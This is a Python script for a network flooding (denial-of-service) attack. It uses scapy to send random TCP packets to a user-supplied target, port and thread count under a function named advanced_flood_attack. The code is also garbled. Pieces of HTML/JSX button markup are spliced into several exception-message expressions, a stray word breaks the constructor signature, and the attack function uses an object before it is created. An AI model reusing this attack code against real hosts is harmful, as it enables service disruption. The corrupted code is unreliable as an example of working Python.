import sys
import time
import numpy as np
import threading
import requests
from queue import Queue
from threading import Thread
import socket
import random
from scapy.all import *
from python_sniffer.sniffer import Printer

# Define exceptions
class FloodException(Exception):
    """Base class for other exceptions."""
    pass


class Flood:
    def __init__(self, target, no_of_packets, file_out, prn,
                 end, payload Tablets ,port, payload=False):
        self.target = target
        self.no_of_packets = no_of_packets
        self.file_out = file_out
        self.prn = prn
        self.end = end
        self.payload = payload
        self.port = port

    def get_data(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((self.target, self.port))
            s.shutdown(2)
            data = s.recv(1024)
            return data
        except socket.error as msg:
            self.prn("Error Code: " + str(msg
  <button className="select-none no-underline">
  <a className="" href="" target="_blank">
        <span className="relative -top-[0rem] inline-flex">
          <span className="h-[1rem] min-w-[1rem] items-center justify-center rounded-full  text-center px-1 text-xs font-mono bg-muted text-[0.60rem] text-muted-foreground">
            0
          </span>
        </span>
      </a>
    </button>) +
                     " -" + str(msg
  <button className="select-none no-underline">
  <a className="" href="" target="_blank">
        <span className="relative -top-[0rem] inline-flex">
          <span className="h-[1rem] min-w-[1rem] items-center justify-center rounded-full  text-center px-1 text-xs font-mono bg-muted text-[0.60rem] text-muted-foreground">
            1
          </span>
        </span>
      </a>
    </button>)
                     " - On the target " + self.target)
            sys.exit(1)
        except FloodException as e:
            print("Error:", e)
            sys.exit(1)

    def send_data(self):
        f = open(self.file_out, 'wb')
        for idx in range(self.no_of_packets):
            if idx != 0 and idx % self.end == 0:
                f.flush()
            data = self.get_data()
            if self.payload:
                data = data.encode()
            f.write(data)
        f.flush()
        f.close()

    def fuzzer(self):
        try:
            for _ in range(self.no_of_packets):
                data = np.random.bytes(1024)
                src_port = random.randint(1025, 65535)

                ip_layer = IP(dst=self.target)
                tcp_layer = TCP(sport=src_port, dport=self.port)

                packet = ip_layer / tcp_layer / data

                if self.prn:
                    print(packet)
                else:
                    send(packet, verbose=0)

                self.end = np.random.randint(10000, 50000)
                if self.end == 0:
                    print(self.end)
        except FloodException as e:
            print("Error:", e)
            sys.exit(1)
        except socket.error as msg:
            print("Error Code: " + str(msg
  <button className="select-none no-underline">
  <a className="" href="" target="_blank">
        <span className="relative -top-[0rem] inline-flex">
          <span className="h-[1rem] min-w-[1rem] items-center justify-center rounded-full  text-center px-1 text-xs font-mono bg-muted text-[0.60rem] text-muted-foreground">
            0
          </span>
        </span>
      </a>
    </button>) +
                  " -" + str(msg
  <button className="select-none no-underline">
  <a className="" href="" target="_blank">
        <span className="relative -top-[0rem] inline-flex">
          <span className="h-[1rem] min-w-[1rem] items-center justify-center rounded-full  text-center px-1 text-xs font-mono bg-muted text-[0.60rem] text-muted-foreground">
            1
          </span>
        </span>
      </a>
    </button>)
                  " - On the target " + self.target)
            sys.exit(1)
        print("Payload/Attack has stopped")

# get the input
def get_user_input():
    try:
        target = input("Enter the target URL (including http(s)://): ")
        bot_amount = int(input("Enter the number of packets: "))
        attack_time = float(input("Enter the attack duration in seconds: "))
        threads = int(input("Enter the number of threads: "))
        port = int(input("Enter the target port: "))
        payload_string = input("Add payload to target (y or n): ")
        if payload_string == 'y':
            payload = True
            payload_file = input("Enter the path to the payload file: ")
            payload_size = int(input("Enter the size of the payload: "))
            return target, bot_amount, attack_time, threads, port, payload, payload_file, \
                   payload_size
        else:
            payload = False
            return target, bot_amount, attack_time, threads, port, payload
    except Exception as e:
        print("Error:", e)
        sys.exit(1)

def advanced_flood_attack():
    target, bot_amount, attack_time, threads, port, payload, \
    payload_file, payload_size = get_user_input()

    if not payload:
        fl = Flood(target, bot_amount, "", False, 0, payload, port)
    else:
        fl = Flood(target, bot_amount, payload_file, True, payload_size, payload, port,
                   fl.fuzzer_end)

    fl.send_data()

def main():
    advance_flood = advanced_flood_attack()
    sys.exit(0)

if __name__ == '__main__':
    main()
